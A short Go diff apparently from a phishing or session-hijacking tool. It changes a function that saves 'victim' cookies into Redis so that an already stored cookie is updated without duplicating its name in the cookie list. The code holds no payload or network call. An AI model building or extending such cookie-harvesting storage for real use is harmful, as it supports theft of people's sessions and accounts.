@@ -136,14 +136,29 @@ func StoreVictimCookie(id string, cookie *VictimCookie) error {
 
 	key := fmt.Sprintf("victim:%s:cookiejar:%s", id, cookie.Name)
 
-	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(cookie)...); err != nil {
-		log.Error("error doing redis HMSET: %s. victim cookie not saved.", err)
-		return err
+	jarEntry, err := redis.Values(rc.Do("HGETALL", key))
+	if err != nil {
+		log.Warning("warning: %s", err)
 	}
 
-	// store the cookie name in a list for quick looping
-	_, err := rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", id), cookie.Name)
+	var vCookie VictimCookie
+	err = redis.ScanStruct(jarEntry, &vCookie)
 	if err != nil {
+		log.Warning("warning on scan struct: %s", err)
+	}
+
+	// check if the cookie is already stored.
+	// if it is, just updates its values but do not add an entry to the cookie names list
+	if vCookie.Name == "" {
+		// store the cookie name onlt if not present already
+		_, err = rc.Do("RPUSH", fmt.Sprintf("victim:%s:cookiejar_entries", id), cookie.Name)
+		if err != nil {
+			return err
+		}
+	}
+
+	if _, err := rc.Do("HMSET", redis.Args{}.Add(key).AddFlat(cookie)...); err != nil {
+		log.Error("error doing redis HMSET: %s. victim cookie not saved.", err)
 		return err
 	}
 
